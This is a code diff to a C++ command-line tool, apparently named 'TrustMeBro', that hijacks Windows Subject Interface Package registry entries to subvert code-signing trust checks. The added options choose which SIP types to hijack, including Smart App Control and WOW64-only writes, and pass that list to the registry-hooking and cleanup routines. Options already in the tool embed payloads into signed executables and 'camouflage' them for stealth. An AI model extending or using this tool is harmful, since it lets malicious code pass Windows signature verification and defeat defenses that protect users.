@@ -13,6 +13,10 @@ void print_usage(char* argv0) {
     std::fprintf(stderr, "  --custom-provider-clean <GUID> Remove a custom FinalPolicy provider\n");
     std::fprintf(stderr, "  --clone          Clone metadata (Version Info, Icon) from source to target\n");
     std::fprintf(stderr, "  --no-hijack      Disable Registry Hijacking (Default: Hijacking Enabled)\n");
+    std::fprintf(stderr, "  --wow64-only     Write only to WOW6432Node (32-bit callers)\n");
+    std::fprintf(stderr, "  --sip-types <types> Comma-separated SIP types (default: PE,PowerShell,MSI). Use 'all' for all 17.\n");
+    std::fprintf(stderr, "  --sac            Include Smart App Control SIP (Win11 only)\n");
+    std::fprintf(stderr, "  --all-sips       Include all 19 SIP GUIDs\n");
     std::fprintf(stderr, "  --embed <file>   Embed payload into signed PE (no steal/hijack)\n");
     std::fprintf(stderr, "  --extract <file> Extract embedded payload from signed PE\n");
     std::fprintf(stderr, "  --camouflage     Use SPC_NESTED_SIGNATURE OID for stealth\n");
@@ -29,11 +33,14 @@ int main(int argc, char* argv[]) {
     bool clone_mode = false;
     bool hijack_mode = true; // Default to true
     bool wow64_only = false;
+    bool include_sac = false;
+    bool all_sips = false;
     bool camouflage = false;
     std::string src, dst;
     std::string embed_payload, extract_output;
     std::string oid = "1.3.6.1.4.1.311.99.1";
     std::string custom_provider_guid;
+    std::string sip_types_str;
     
     for (int i = 1; i < argc; ++i) {
         if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) {
@@ -62,6 +69,12 @@ int main(int argc, char* argv[]) {
             hijack_mode = false;
         } else if (strcmp(argv[i], "--wow64-only") == 0) {
             wow64_only = true;
+        } else if (strcmp(argv[i], "--sac") == 0) {
+            include_sac = true;
+        } else if (strcmp(argv[i], "--all-sips") == 0) {
+            all_sips = true;
+        } else if (strcmp(argv[i], "--sip-types") == 0 && i + 1 < argc) {
+            sip_types_str = argv[++i];
         } else if (strcmp(argv[i], "--camouflage") == 0) {
             camouflage = true;
         } else if (strcmp(argv[i], "--embed") == 0 && i + 1 < argc) {
@@ -98,7 +111,13 @@ int main(int argc, char* argv[]) {
     }
 
     if (clean_mode) {
-        if (cleanup_registry()) {
+        auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
+        if (sips.empty() && !sip_types_str.empty()) return EXIT_FAILURE;
+        if (sips.empty()) {
+            // Default: clean all standard SIPs
+            for (int i = 0; i < NUM_STANDARD_SIPS; i++) sips.push_back(ALL_STANDARD_SIPS[i]);
+        }
+        if (cleanup_registry(sips)) {
             std::cout << "[+] Registry cleanup successful." << std::endl;
             std::cout << "[!] Note: You may need to log out and log back in for changes to take effect." << std::endl;
             return EXIT_SUCCESS;
@@ -163,8 +182,13 @@ int main(int argc, char* argv[]) {
     if (g_verbose) std::cout << "[*] Starting TrustMeBro..." << std::endl;
 
     if (hijack_mode) {
+        auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
+        if (sips.empty()) return EXIT_FAILURE;
+        std::cout << "[*] Targeting " << sips.size() << " SIP(s):";
+        for (auto& s : sips) std::wcout << L" " << s.name;
+        std::cout << std::endl;
         if (wow64_only) std::cout << "[!] WOW64-only mode: writing to WOW6432Node only. Affects 32-bit callers." << std::endl;
-        if (!hook_registry(wow64_only)) {
+        if (!hook_registry(sips, wow64_only)) {
             std::cerr << "[-] Failed to hijack registry keys." << std::endl;
             return EXIT_FAILURE;
         }
